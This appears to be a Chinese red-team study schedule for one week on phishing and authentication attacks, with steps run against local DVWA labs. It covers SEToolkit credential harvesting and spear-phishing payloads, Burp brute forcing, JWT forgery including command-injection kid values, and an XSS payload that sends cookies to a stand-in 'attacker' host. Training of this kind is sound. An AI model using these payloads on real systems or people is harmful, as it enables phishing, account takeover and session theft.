@@ -1,0 +1,484 @@
+================================================================================
+第16周：社会工程学与认证攻击 (Web深入期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"从钓鱼网站到凭证窃取的完整社会工程攻击链"为贯穿案例，学员学习SEToolkit
+社会工程学工具包进行钓鱼攻击，随后深入学习Web认证与会话管理机制，掌握Burp
+Intruder批量暴力破解、JWT（JSON Web Token）攻击、Session攻击等高级认证攻击技术。
+本阶段属于"Web深入期"，社会工程学是红队渗透中最有效的人类攻击面。
+
+【本周学习目标】
+1. 掌握SEToolkit (Social Engineering Toolkit) 的核心攻击功能
+2. 能够独立完成凭证收割(Credential Harvester)钓鱼攻击全流程
+3. 理解Web认证机制：基本认证、表单认证、Token认证、OAuth/SSO
+4. 掌握会话管理原理：Cookie、Session ID、JWT Token
+5. 熟练使用Burp Intruder进行多模式暴力破解攻击
+6. 掌握JWT攻击技术：None算法攻击、密钥爆破、kid注入、jku注入
+7. 掌握Session攻击：Session固定、Session劫持、Session预测
+8. 理解认证绕过、权限提升、水平越权和垂直越权攻击
+
+【本周知识清单】
+★ SEToolkit社会工程学
+  - SET框架架构：8大攻击向量
+    * 1) Spear-Phishing Attack Vectors（鱼叉式钓鱼）
+    * 2) Website Attack Vectors（网站攻击向量）
+    * 3) Infectious Media Generator（感染媒介生成器）
+    * 4) Create a Payload and Listener（payload生成和监听器）
+    * 5) Mass Mailer Attack（批量邮件攻击）
+    * 6) Arduino-Based Attack Vector（Arduino攻击）
+    * 7) Wireless Access Point Attack Vector（无线AP攻击）
+    * 8) QRCode Generator Attack Vector（二维码攻击）
+  - Credential Harvester (凭证收割)：克隆网站+窃取输入的凭据
+  - 钓鱼邮件的构造要素：发件人伪装、主题诱骗、正文SOCE、附件投递
+  - 网站克隆技术：完整前端克隆 vs 关键页面克隆
+
+★ 认证与授权基础
+  - 认证(Authentication) vs 授权(Authorization) vs 会话(Session)
+  - 常见认证机制：
+    * HTTP Basic Authentication（Base64编码的用户密码）
+    * HTTP Digest Authentication（MD5哈希防重放）
+    * Form-Based Authentication（表单认证，最常见）
+    * Token-Based Authentication（JWT, OAuth2, SAML）
+    * Multi-Factor Authentication (MFA)
+    * Certificate-Based Authentication (证书认证)
+  - 密码存储：明文 vs 哈希(MD5/SHA) vs 加盐哈希(bcrypt/argon2)
+  - 会话管理：Cookie(Set-Cookie)、Session ID、LocalStorage、JWT
+  - 常见漏洞：弱密码策略、无速率限制、明文传输、不安全的重置功能
+
+★ Burp Intruder暴力破解
+  - Intruder攻击类型：
+    * Sniper（狙击手）：单个payload位置逐个替换
+    * Battering Ram（冲撞车）：多个payload位置使用相同值
+    * Pitchfork（叉子）：多个payload位置使用对应位置的多个词表
+    * Cluster Bomb（集束炸弹）：多个payload位置的所有组合
+  - Payload类型：
+    * Simple List：简单词表（用户名列表、密码列表）
+    * Numbers：数字序列（ID遍历）
+    * Dates：日期范围
+    * Brute Forcer：字符集暴力生成
+    * Custom Iterator：自定义迭代器
+  - Grep-Match：从响应中提取特定模式（登录成功/失败的标志）
+  - Grep-Extract：提取响应中的特定数据
+  - 爆破优化：线程控制、延迟设置、失败重试
+
+★ JWT (JSON Web Token) 攻击
+  - JWT结构：Header.Payload.Signature (三段Base64编码)
+  - Header参数：alg(算法)、typ(类型)、kid(密钥ID)、jku(JWK Set URL)
+  - 常见JWT攻击：
+    * None Algorithm：修改alg为none，删除签名部分
+    * Weak HMAC Key：弱密钥暴力破解（jwt-cracker, john, hashcat）
+    * kid注入：kid参数注入实现目录穿越/SQL注入/命令注入
+    * jku/jwk注入：篡改jku URL指向攻击者控制的JWK Set
+    * alg混淆：将RS256改为HS256，使用公钥作为HMAC密钥签名
+    * 过期时间操纵：修改exp声明延长Token有效期
+    * 权限提升：修改role/userId等自定义声明
+
+★ Session攻击
+  - Session固定(Session Fixation)：攻击者固定受害者Session ID
+  - Session劫持(Session Hijacking)：通过XSS/中间人/网络嗅探获取Session ID
+  - Session预测(Session Prediction)：分析Session ID生成规律预测有效Session
+  - Cookie属性安全：
+    * Secure：仅通过HTTPS传输
+    * HttpOnly：禁止JavaScript访问（防XSS窃取）
+    * SameSite：Strict/Lax/None控制跨站发送
+  - Session管理最佳实践：登录后重新生成、超时失效、安全标志
+
+【本周工具清单】
+  - SEToolkit (Social Engineering Toolkit)
+  - Burp Suite Professional/Community (Intruder)
+  - JWT_Tool / jwt-cracker / jwt.io
+  - DVWA (靶场)
+  - Metasploitable2 (靶机)
+
+================================================================================
+周一：SEToolkit钓鱼攻击
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：SEToolkit框架架构、攻击向量分类和社会工程学攻击原理
+  - 社会工程学定义：利用人类心理弱点而非技术漏洞的攻击方式
+  - SEToolkit (Social-Engineer Toolkit) 概述：TrustedSec开发的开源社工框架
+  - 八大攻击向量详解：
+    1. 鱼叉式钓鱼：针对特定目标的高度定制化钓鱼邮件+恶意附件
+    2. 网站攻击：克隆网站+凭证收割+Java Applet/Browser Exploit
+    3. 感染媒介：生成带autorun.inf的USB/CD恶意载荷
+    4. 载荷与监听器：独立生成payload（类似msfvenom）
+    5. 批量邮件：大量发送统一钓鱼邮件
+    6. Arduino攻击：针对物理设备
+    7. 无线AP攻击：创建Rogue AP蜜罐
+    8. QRCode攻击：恶意二维码
+  - Credential Harvester攻击链：
+    克隆目标网站 -> 部署在攻击者服务器 -> 
+    诱导受害者访问（邮件/短信/社交） -> 
+    受害者输入凭据 -> 凭据发送到攻击者
+  - 社工攻击成功的关键因素：信任建立、紧迫感诱导、权威模仿、社会认同
+  - 伦理与法律：仅在授权渗透测试中使用，必须获得书面授权
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/04-社会工程学攻击(SET).txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用SEToolkit进行Credential Harvester和网站克隆攻击
+  参考文件：/home/a/成长为一个红队/archstrike-exploit教学/04-社会工程学攻击(SET).txt
+
+  操作步骤：
+    Step 1: sudo setoolkit 启动SEToolkit（或 sudo se-toolkit）
+    Step 2: 主菜单选择: 1) Social-Engineering Attacks
+    Step 3: 子菜单选择: 2) Website Attack Vectors
+    Step 4: 再选择: 3) Credential Harvester Attack Method
+    Step 5: 选择: 2) Site Cloner（克隆网站）
+    Step 6: 设置攻击者IP（监听地址）: 192.168.56.1
+    Step 7: 输入要克隆的URL: http://localhost/dvwa/login.php
+    Step 8: 等待SET完成克隆和服务器启动
+    Step 9: 在另一个浏览器/虚拟机中访问 http://192.168.56.1
+    Step 10: 观察克隆的DVWA登录页面
+    Step 11: 在克隆页面输入用户名和密码并提交
+    Step 12: 回到SET终端，观察是否收到凭据（Credential Harvester结果）
+    Step 13: 返回SET主菜单，尝试: 1) Spear-Phishing Attack Vectors
+    Step 14: 选择: 1) Perform a Mass Email Attack
+    Step 15: 选择payload: 如 Adobe PDF embedded EXE
+    Step 16: 配置邮件参数（发件人、主题、正文、附件）
+    Step 17: 注意：仅在授权测试环境中练习，不对外发送
+    Step 18: 回到SET，尝试: 4) Create a Payload and Listener
+    Step 19: 生成Windows反向TCP payload: windows/meterpreter/reverse_tcp
+    Step 20: 观察payload生成和监听器启动的完整流程
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：认证与会话基础
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Web认证机制、会话管理原理和常见安全漏洞
+  - 认证 vs 授权 vs 会话：
+    * 认证(Authentication)：你是谁？（验证身份）
+    * 授权(Authorization)：你能做什么？（检查权限）
+    * 会话(Session)：保持认证状态（避免重复登录）
+  - HTTP是无状态协议，认证状态通过以下方式维护：
+    * Cookie: Set-Cookie: PHPSESSID=xxx; HttpOnly; Secure
+    * Session ID: 服务器端存储的会话标识符
+    * Token: Bearer Token (JWT, OAuth2 Access Token)
+    * Local Storage / Session Storage (SPA应用)
+  - 常见认证漏洞：
+    * 弱密码策略（无复杂度要求、无长度限制）
+    * 无暴力破解保护（无速率限制、无账户锁定）
+    * 明文密码传输（无HTTPS）
+    * 不安全密码存储（明文或弱哈希MD5/SHA1）
+    * 密码重置功能缺陷（不安全的安全问题、Token可预测）
+    * 注册功能缺陷（用户名枚举、重复注册）
+    * "Remember Me"功能缺陷（可预测Token、持久Cookie）
+  - 常见会话漏洞：
+    * Session固定：攻击者设置受害者Session ID
+    * Session劫持：获取其他用户的Session ID
+    * Session未失效：登出后Session仍有效
+    * 会话超时过长：长时间无活动也不失效
+    * 并发会话无限制：同一用户允许多设备登录
+  - 认证绕过技术：
+    * SQL注入绕过登录：' OR 1=1 --
+    * 参数污染：username=admin&username=attacker
+    * 类型混淆：{"username":"admin", "password":true}
+    * 逻辑缺陷：修改响应中的状态码/布尔值
+  参考文件：/home/a/成长为一个红队/网安基础知识/09-认证与授权基础.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用Burp Suite分析Web认证与会话管理机制
+  操作步骤：
+    Step 1: 启动Burp Suite，开启代理拦截
+    Step 2: 浏览器设置代理为127.0.0.1:8080
+    Step 3: DVWA安全级别设为Low
+    Step 4: 访问 http://localhost/dvwa/login.php
+    Step 5: 输入正确凭据登录（admin/password）
+    Step 6: 在Burp中查看登录请求:
+      - 观察HTTP方法(GET/POST)
+      - 观察用户名密码的传输方式（明文/加密）
+      - 观察Set-Cookie响应头（session ID格式）
+    Step 7: 记录DVWA的PHPSESSID值
+    Step 8: 在Burp中发送登录请求到Repeater
+    Step 9: 在Repeater中修改密码为错误值，观察响应差异
+    Step 10: 分析错误响应中是否暴露用户名是否存在的信息（用户名枚举）
+    Step 11: 登出DVWA（点击Logout）
+    Step 12: 登出后尝试重新使用旧PHPSESSID访问页面
+    Step 13: 观察服务器是否仍然接受旧的Session（会话未失效测试）
+    Step 14: 访问 http://localhost/dvwa/security.php
+    Step 15: 手动修改PHPSESSID为一个不存在的值，观察访问结果
+    Step 16: 在Proxy -> HTTP History中分析整个会话过程中的Cookie变化
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：Burp Intruder暴力破解
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Burp Intruder攻击类型、Payload配置和爆破优化策略
+  - Intruder在渗透测试中的应用场景：
+    * 密码暴力破解
+    * 用户名列枚举
+    * ID遍历（资源枚举）
+    * 参数模糊测试（Fuzzing）
+    * 目录/文件发现
+  - 四种攻击类型对比：
+    * Sniper：单个位置逐个测试 -> N个payload测试
+    * Battering Ram：多个位置使用同一值 -> N个测试
+    * Pitchfork：多个位置使用对应词表 -> min(N1,N2)个测试
+    * Cluster Bomb：所有位置的所有组合 -> N1 x N2个测试
+  - Payload配置技巧：
+    * 使用常见密码词表（rockyou.txt, darkweb2017.txt）
+    * 使用自定义词表（根据目标信息生成）
+    * 使用Numbers payload进行ID枚举
+    * 使用Brute Forcer生成特定字符集的组合
+  - 爆破优化：
+    * Grep-Match：自动标记成功/失败响应
+    * Filter by response length：过滤长度不同的响应
+    * Resource Pool：多线程并发控制
+    * Throttle：请求延迟（避开WAF/速率限制）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用Burp Intruder对DVWA登录表单进行多模式暴力破解
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 进入DVWA Brute Force页面
+    Step 3: Burp Suite开启拦截，拦截登录请求
+    Step 4: 将拦截的请求发送到Intruder (Ctrl+I 或右键 -> Send to Intruder)
+    Step 5: 进入Intruder -> Positions标签
+    Step 6: 点击Clear清除所有自动标记的payload位置
+    Step 7: 选中username参数值和password参数值，分别点击Add添加为payload位置
+    Step 8: 将Attack Type设为 Sniper（先用Sniper测试username）
+    Step 9: 进入Payloads标签，选择Payload Type: Simple List
+    Step 10: 加载用户名列表: admin, user, test, guest, root, dvwa, user1
+    Step 11: 进入Options标签，Grep-Match中添加 "Welcome to the password protected area"
+    Step 12: 点击Start Attack，观察结果中哪些用户名有成功的Grep-Match
+    Step 13: 将Attack Type改为 Cluster Bomb
+    Step 14: 第一个payload位置（username）使用确认的用户名列表
+    Step 15: 第二个payload位置（password）加载密码列表:
+      password, admin, 123456, admin123, 12345678, letmein, qwerty
+    Step 16: 使用Grep-Match标记登录成功的响应
+    Step 17: 点击Start Attack，等待所有组合测试完毕
+    Step 18: 按Grep-Match列排序，找到成功登录的用户名和密码组合
+    Step 19: 测试成功后，切换到DVWA Medium安全级别
+    Step 20: 观察Medium级别是否引入了反自动化保护（验证码、Token等）
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：JWT攻击
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：JWT (JSON Web Token) 结构分析、安全漏洞和攻击技术
+  - JWT定义：紧凑的、URL安全的、用于在各方之间传输声明的开放标准(RFC 7519)
+  - JWT三段式结构：Header.Payload.Signature
+    * Header: {"alg":"HS256","typ":"JWT"} -> Base64Url编码
+    * Payload: {"sub":"123","name":"admin","iat":1516239022,"exp":...} -> Base64Url编码
+    * Signature: HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload), secret)
+  - 常见签名算法：
+    * HS256 (HMAC with SHA-256)：对称密钥，签发和验证使用同一密钥
+    * RS256 (RSA with SHA-256)：非对称密钥，私钥签发公钥验证
+    * ES256 (ECDSA with SHA-256)：椭圆曲线
+    * None：无签名（仅用于测试，但实现不当会被利用）
+  - JWT攻击技术详解：
+    1. None Algorithm攻击：
+       - 修改alg为"none"
+       - 删除Signature部分（保留最后的点）
+       - 如服务端接受none算法 -> 任意篡改Payload
+    2. HMAC密钥爆破：
+       - 使用jwt-cracker或hashcat爆破HS256/HS384/HS512弱密钥
+       - 目标：找到密钥后伪造任意JWT
+    3. kid注入：
+       - kid(Key ID)参数用于指定验证签名的密钥
+       - 目录穿越：kid=../../../../dev/null -> 使用空文件签名
+       - SQL注入：kid=xxx' UNION SELECT 'secret_key'-- ->
+       - 命令注入：kid=xxx|whoami ->
+    4. jku注入：
+       - jku(JWK Set URL)指定JWK Set的来源URL
+       - 如果服务端验证jku -> 指向攻击者控制的JWK Set
+       - 攻击者用自己私钥签名JWT，公钥放在恶意JWK Set中
+    5. 算法混淆攻击(Algorithm Confusion)：
+       - 将alg从RS256改为HS256
+       - 使用RS256公钥作为HS256的HMAC密钥
+       - 用公钥以HS256重新签名JWT（公钥通常可获取）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：JWT在线分析和本地攻击实践
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+  操作步骤：
+    Step 1: 浏览器访问 https://jwt.io 在线JWT调试器
+    Step 2: 理解JWT三段结构：Header(红)、Payload(紫)、Signature(蓝)
+    Step 3: 在jwt.io的Encoded框中修改Header和Payload，观察Decoded的变化
+    Step 4: 安装jwt-cracker: sudo apt install npm && npm install -g jwt-cracker
+    Step 5: 或使用git: git clone https://github.com/lmammino/jwt-cracker
+    Step 6: 生成一个测试JWT:
+      使用在线工具或Python生成: python3 -c "import jwt; print(jwt.encode({'user':'admin'}, 'secret', algorithm='HS256'))"
+    Step 7: 使用jwt-cracker爆破密钥: jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" "abcdefghijklmnopqrstuvwxyz"
+    Step 8: 测试None Algorithm攻击:
+      在jwt.io中将Header的alg改为"none"
+      删除Signature（保留最后的点）
+      使用该JWT测试是否存在None Algorithm漏洞
+    Step 9: 安装python3 pyjwt库进行JWT操作: pip3 install pyjwt
+    Step 10: 编写Python脚本测试None Algorithm:
+      import jwt
+      token = jwt.encode({"user":"admin"}, "", algorithm="none")
+      print(token)
+    Step 11: 使用jwt_tool进行自动JWT检测:
+      git clone https://github.com/ticarpi/jwt_tool
+      cd jwt_tool && python3 jwt_tool.py <JWT_TOKEN>
+    Step 12: 测试JWT篡改Payload：
+      修改user声明从guest到admin
+      修改exp声明延长过期时间
+      观察服务端的响应差异
+    Step 13: 在DVWA或Metasploitable2中寻找JWT相关的应用进行测试
+    Step 14: 使用curl发送篡改后的JWT测试API接口的鉴权
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：Session攻击综合练习
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Session管理深度安全分析和综合攻击链
+  - Session攻击分类汇总：
+    1. Session固定(Session Fixation)：
+       攻击者设定受害者Session ID -> 受害者登录 -> 攻击者使用该Session
+    2. Session劫持(Session Hijacking)：
+       通过网络嗅探/XSS/Cookie泄露获取他人Session ID
+    3. Session预测(Session Prediction)：
+       分析Session ID生成算法预测合法Session
+    4. 跨站请求伪造(CSRF)利用Session自动携带
+    5. Session投毒(Session Poisoning)：
+       在Session中注入恶意数据影响应用逻辑
+  - Cookie属性安全深度：
+    * Secure：仅通过HTTPS传输（防中间人嗅探）
+    * HttpOnly：禁止JavaScript访问document.cookie（防XSS窃取）
+    * SameSite=Strict：完全禁止跨站发送Cookie
+    * SameSite=Lax：允许顶级导航发送Cookie（GET请求）
+    * SameSite=None：允许所有跨站请求（需同时设置Secure）
+    * Domain：指定Cookie的有效域名范围
+    * Path：指定Cookie的有效路径范围
+    * Expires/Max-Age：Cookie有效期
+  - 常见Session管理缺陷：
+    * 登录前后Session ID不变（Session固定攻击可钻）
+    * 登出不清除服务端Session
+    * Session ID通过URL传递（URL重写）
+    * Session存储在不安全位置（LocalStorage vs Cookie）
+    * 缺少并发Session限制
+  - 本周攻击链串联：
+    SET钓鱼获取凭据 -> 登录后观察Session机制 -> Burp爆破测试 ->
+    Session固定攻击 -> JWT篡改提权 -> 凭证嗅探
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：Session攻击综合练习
+  操作步骤：
+    Step 1: Session固定攻击练习:
+      - DVWA安全级别设为Low
+      - 获取一个未认证的PHPSESSID: 直接访问DVWA获取Cookie
+      - 构造URL: http://localhost/dvwa/login.php?PHPSESSID=attacker_session_id
+      - 如果应用接受URL中的PHPSESSID -> Session固定成功
+      - 当受害者使用此URL登录后，攻击者可用同一PHPSESSID访问受害者会话
+    Step 2: 使用Burp Suite分析Session特征:
+      - 多次登录/登出，观察PHPSESSID的变化
+      - 分析Session ID的生成模式（随机/递增/可预测）
+      - 对比登录前后的PHPSESSID是否变化
+      - 观察登出后Session是否失效
+    Step 3: 测试Cookie属性:
+      - 使用Burp查看Set-Cookie头
+      - 检查是否设置Secure/HttpOnly/SameSite属性
+      - 检查Cookie过期时间设置
+    Step 4: Session劫持模拟:
+      - 在XSS存储页面注入: <script>new Image().src='http://attacker/?c='+document.cookie</script>
+      - 启动netcat监听: nc -lvp 80
+      - 另一个浏览器访问被注入的XSS页面
+      - 观察netcat是否接收到Cookie
+    Step 5: 综合认证攻击链:
+      - SET克隆DVWA登录页面
+      - 钓鱼获取管理员Cookie/Session
+      - 使用窃取的Session直接访问管理页面
+      - 如果为JWT: 篡改Payload提升权限
+    Step 6: 对比分析不同认证机制的优缺点:
+      - Session Cookie vs JWT vs OAuth2
+      - 各自的攻击面和防护措施
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - SEToolkit八大攻击向量和Credential Harvester完整流程
+  - 认证机制对比：HTTP Basic, Form-Based, Token(JWT), OAuth2, SAML
+  - Burp Intruder四种攻击类型：Sniper/Battering Ram/Pitchfork/Cluster Bomb
+  - JWT攻击技技术：None Algorithm, 密钥爆破, kid注入, jku注入, alg混淆
+  - Session攻击分类：固定、劫持、预测、投毒
+  - Cookie安全属性：Secure, HttpOnly, SameSite
+
+💻 第2小时 | SET + DVWA综合实战 (09:00 - 10:00)
+  练习内容：不参考笔记，完成SET钓鱼到DVWA凭证窃取的完整攻击链
+  操作步骤：
+    Step 1: 使用SET克隆DVWA登录页面
+    Step 2: 通过钓鱼页面获取测试凭据
+    Step 3: 使用Burp Intruder对DVWA进行密码爆破
+    Step 4: 分析DVWA的认证和会话安全缺陷
+    Step 5: 整理完整的认证攻击测试报告
+
+🔓 第3小时 | HackTheBox / TryHackMe 认证挑战 (10:00 - 11:00)
+  练习内容：在在线平台寻找认证/会话/JWT相关的挑战
+  操作步骤：
+    Step 1: 连接HTB VPN或访问THM
+    Step 2: 在THM中搜索"Authentication"或"JWT"相关房间
+    Step 3: 尝试HTB中包含JWT攻击的靶机（如"Backdoor"有JWT相关）
+    Step 4: 练习JWT攻击和认证绕过技术
+    Step 5: 记录flag和攻击路径
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/网安基础知识/09-认证与授权基础.txt
+  /home/a/成长为一个红队/archstrike-exploit教学/04-社会工程学攻击(SET).txt
+  /home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-exploit教学/04-社会工程学攻击(SET).txt
+  /home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt
+
+在线练习：
+  - DVWA (http://localhost/dvwa)
+  - HackTheBox认证相关靶机 (https://app.hackthebox.com)
+  - TryHackMe认证/会话房间 (https://tryhackme.com)
+  - PortSwigger Web Security Academy - Authentication (https://portswigger.net/web-security/authentication)
+  - jwt.io (JWT在线分析工具)
+
+推荐工具安装：
+  - SEToolkit (sudo apt install set / git clone https://github.com/trustedsec/social-engineer-toolkit)
+  - Burp Suite Community Edition
+  - jwt_tool (git clone https://github.com/ticarpi/jwt_tool)
+  - jwt-cracker (npm install -g jwt-cracker)
+  - Python3 pyjwt (pip3 install pyjwt)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
